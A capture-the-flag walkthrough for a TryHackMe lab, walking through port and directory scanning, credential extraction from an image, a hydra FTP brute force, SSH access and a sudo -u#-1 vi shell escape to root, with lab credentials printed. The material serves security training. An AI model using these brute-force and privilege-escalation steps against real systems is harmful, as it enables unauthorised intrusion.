# [Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)

## Time to enter the warren...

# Flags

### What is the user flag?

1. Nmap scan to identify open ports and running services

```bash
nmap -sV IP
```

![SCREEN01](https://github.com/user-attachments/assets/49d36bb1-589e-4bf9-b95f-d720b825f110)

2. Use Gobuster to discover hidden directories and files on the web server

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,js
```

![SCREEN02](https://github.com/user-attachments/assets/382f226d-a60f-4fff-8c96-a7c87f391567)

3. The CSS file `http://IP/assets/style.css` contains a hidden reference to `/sup3r_s3cr3t_fl4g.php`

4. Disable javascript in `about:config` by setting `javascript.enabled` to `false`

![SCREEN03](https://github.com/user-attachments/assets/dcfe9164-449d-42f6-bf67-e195751767b5)

5. In `http://IP/sup3r_s3cret_fl4g.php` one of the requests reveals the hidden directory `/WExYY2Cv-qU`

![SCREEN04](https://github.com/user-attachments/assets/12d807cb-ff87-4bad-86dd-e71a95c3a55f)

6. Navigate to `http://IP/WExYY2Cv-qU/` and download the `Hot_Babe.png` image

7. Use the `strings` command to extract login and passwords from the image file

```bash
strings Hot_Babe.png
```

![SCREEN05](https://github.com/user-attachments/assets/959f98c6-e973-4973-a2ae-02ae8d878f5e)

8. Brute force the FTP service with the discovered username
   - The credentials are `ftpuser:5iez1wGXKfPKQ`

```bash
hydra -l ftpuser -P passwords.txt ftp://IP
```

![SCREEN06](https://github.com/user-attachments/assets/1b0bba24-8ed9-4f9b-9492-d2f8c8d8ae8d)

9. Connect to the FTP server and get `Eli's_Creds.txt`

```bash
ftp IP
ls -la
get Eli's_Creds.txt
```

10. Decode the text in [dCode](https://www.dcode.fr/brainfuck-language)
    - The credentials are: `eli:DSpDiM1wAEwid`

![SCREEN07](https://github.com/user-attachments/assets/b36cd3a9-9922-4c7e-9db1-dbb0257732ff)

11. Connect via SSH using the decoded credentials. Search for files containing "s3cr3t", and retrieve the user flag

```bash
ssh eli@IP
find / -name "*s3cr3t*" 2>/dev/null
ls -la /usr/games/s3cr3t/
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
su gwendoline
# Password: MniVCQVhQHUNI
cat /home/gwendoline/user.txt
```

![SCREEN08](https://github.com/user-attachments/assets/4ed5ebe4-4173-4d1e-809a-1acd3969d989)

---

### What is the root flag?

1. Check what sudo privileges the current user has

```bash
sudo -l
```

![SCREEN09](https://github.com/user-attachments/assets/63eedd6e-b22a-40ca-9543-a1126db72f32)

2. Exploit vi to get root access, and get the root flag

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
:!/bin/bash # in vi
cat /root/root.txt
```

![SCREEN10](https://github.com/user-attachments/assets/3360d0ea-fa38-4476-90d0-7f6d56cc595b)
